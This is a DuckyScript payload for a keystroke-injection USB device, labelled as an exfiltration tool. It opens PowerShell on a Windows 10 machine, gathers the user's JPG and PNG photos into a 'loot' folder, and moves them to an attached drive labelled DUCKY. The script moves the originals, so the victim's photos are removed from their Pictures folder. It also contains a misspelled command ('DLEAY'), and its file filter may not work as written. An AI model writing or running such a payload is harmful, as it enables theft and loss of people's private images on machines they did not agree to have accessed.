REM Title: Image copier
REM Author: Dante Sparda with revisions by plusmalias/FalsePhilosopher
REM Description: This script copies image files from the user's Pictures folder to a USB drive labeled "DUCKY"
REM Target: Windows 10 (Powershell)
REM Version: 1.1
REM Category: exfil
REM I used some premise i found below and modified what i needed
REM https://www.mathewjbray.com/powershell/powershell-get-drive-letters-by-volume-name-and-execute-robocopy/
REM Please use responsibly

DELAY 500
GUI R
DELAY 1000
STRINGLN powershell.exe
DELAY 3000

REM Change directory to user's Pictures folder
STRINGLN cd C:\Users\$env:Username\Pictures\
DELAY 300

REM Get all JPG and PNG files in the Pictures folder
STRINGLN $files = Get-ChildItem -Path "C:\Users\$env:Username\Pictures\" -Include *.JPG, *.PNG
DELAY 300

REM Copy the files to the Temp directory
STRINGLN Copy-Item -Path $files.FullName -Destination "C:\Windows\Temp" -Force
DELAY 3000

REM Change directory to the Temp folder
STRINGLN cd C:\Windows\Temp
DELAY 300

REM Create a loot directory in Temp
STRINGLN mkdir loot
DELAY 500

REM Move files to the loot directory
STRINGLN Move-Item -Path $files.FullName -Destination "C:\Windows\Temp\loot"
DELAY 5000

REM Get the drive letter of the USB labeled "DUCKY"
STRINGLN $destinationLetter = (Get-WmiObject -Class Win32_Volume | Where-Object {$_.Label -eq "DUCKY"}).Name
DLEAY 300

REM Move the loot directory to the USB drive
STRINGLN Move-Item -Path "C:\Windows\Temp\loot" -Destination $destinationLetter

END
